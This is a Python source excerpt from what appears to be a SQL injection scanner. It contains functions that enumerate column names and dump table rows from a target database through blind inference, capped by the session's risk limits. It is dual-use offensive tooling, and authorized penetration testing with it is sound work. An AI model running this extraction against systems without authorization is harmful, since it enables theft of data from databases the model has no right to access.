) -> dict[str, Any]:
    result = _result_base(session, "columns", [])
    result["table"] = table
    result["columns"] = []
    dbms = _normalize_dbms(session)
    source = _column_source(dbms, table, database)
    engine = build_blind_engine(session, technique)
    if source is None or engine is None:
        result["warnings"].append(
            f"Blind column enumeration is unavailable for DBMS '{dbms or 'auto'}'."
        )
        return _finalize_collection_result(result, "columns")
    base_query, count_query = source
    row_cap, char_cap = _risk_limits(session)
    total = min(
        row_cap, engine.infer_number(count_query, upper_hint=min(8, row_cap), max_value=row_cap)
    )
    for row_index in range(total):
        value = _infer_text_for_engine(
            engine, _row_query(dbms, base_query, row_index), max_length=char_cap
        )
        if value:
            result["columns"].append(value)
            _record_success(result, f"blind:{technique}")
    _populate_blind_summary(result, engine)
    return _finalize_collection_result(result, "columns")


def dump_table_blind(
    session: ScanSession, table: str, columns: list[str], *, technique: str
) -> dict[str, Any]:
    result = _result_base(session, "dump", [])
    result["table"] = table
    result["columns"] = list(columns)
    result["rows"] = []
    result["output"] = ""
    dbms = _normalize_dbms(session)
    engine = build_blind_engine(session, technique)
    if engine is None or dbms not in _DIALECTS or not columns:
        result["warnings"].append(f"Blind dump is unavailable for DBMS '{dbms or 'auto'}'.")
        return _finalize_rows_result(result, "rows")
    row_cap, char_cap = _risk_limits(session)
    total = min(
        row_cap,
        engine.infer_number(_dump_count_expr(table), upper_hint=min(8, row_cap), max_value=row_cap),
    )
    order_basis = columns[0]
    for row_index in range(total):
        row: dict[str, Any] = {}
        for column in columns:
            text = _infer_text_for_engine(
                engine,
                _dump_value_expr(dbms, table, column, row_index, order_basis),
                max_length=char_cap,
            )
            row[column] = text
        if any(str(value).strip() for value in row.values()):
            result["rows"].append(row)
            _record_success(result, f"blind:{technique}")
    _populate_blind_summary(result, engine)
    return _finalize_rows_result(result, "rows")


__all__ = [
    "BlindDialect",
    "BlindInferenceEngine",
    "build_blind_engine",
    "dialect_for_dbms",
    "dump_table_blind",
    "enumerate_columns_blind",
    "enumerate_databases_blind",
    "enumerate_tables_blind",
]
